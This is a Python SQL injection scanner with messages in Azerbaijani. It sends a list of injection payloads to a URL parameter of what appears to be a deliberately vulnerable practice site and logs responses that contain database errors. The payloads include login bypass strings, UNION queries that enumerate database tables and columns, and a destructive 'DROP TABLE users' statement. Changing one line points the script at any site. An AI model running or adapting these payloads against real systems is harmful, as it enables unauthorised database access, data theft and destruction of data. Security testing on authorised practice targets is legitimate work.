import os
import requests

payloads = [
    "' OR '1'='1' -- ",
    "' UNION SELECT null, table_name FROM information_schema.tables --",
    "' UNION SELECT null, column_name FROM information_schema.columns --",
    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
    "'; DROP TABLE users; --",
    "' OR 1=1; --",
]

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

def check_sql_injection(base_url, payloads):
    vulnerable_urls = []

    if not os.path.exists("Result"):
        os.makedirs("Result")

    result_file_path = os.path.join("Result", "result.txt")

    with open(result_file_path, "w", encoding="utf-8") as file:
        file.write("SQL Injection Test Results...\n")
        file.write("*" * 50 + "\n\n")
        
        for payload in payloads:
            test_url = f"{base_url}{payload}"
            try:
                response = requests.get(test_url, headers=headers,timeout=5)
                status_code = response.status_code
                content_length = len(response.text)
                
                error_signatures = [
                    "mysql", "sql syntax", "syntax error", "odbc", "database error",
                    "you have an error in your sql syntax", "unclosed quotation mark",
                    "invalid column", "ORA-00933"
                ]
                if any(error in response.text.lower() for error in error_signatures):
                    print(f"Zəiflik tapıldı: {test_url}")
                    file.write(f"Zəiflik tapıldı: {test_url}\n")
                    file.write(f"Status kodu: {status_code}, Cavab uzunluğu: {content_length}\n")
                    file.write(f"Cavab nümunəsi: {response.text[:200]}...\n\n")
                    vulnerable_urls.append(test_url)
                else:
                    print(f"Zəiflik yoxdur: {test_url}")
                    file.write(f"Zəiflik yoxdur: {test_url}\n")
                    file.write(f"Status kodu: {status_code}, Cavab uzunluğu: {content_length}\n\n")
            except Exception as e:
                print(f"Sorğuda səhv baş verdi: {test_url} - {e}")
                file.write(f"Sorğuda səhv baş verdi: {test_url} - {e}\n\n")
        
        file.write("\nTest Is Done...\n")
    
    return vulnerable_urls

base_url = "http://testphp.vulnweb.com/artists.php?artist="
vulnerable = check_sql_injection(base_url, payloads)

if vulnerable:
    print("\nAşağıdakı URL-lər SQL injection üçün zəifdir:")
    for url in vulnerable:
        print(url)
else:
    print("\nHeç bir zəiflik tapılmadı.")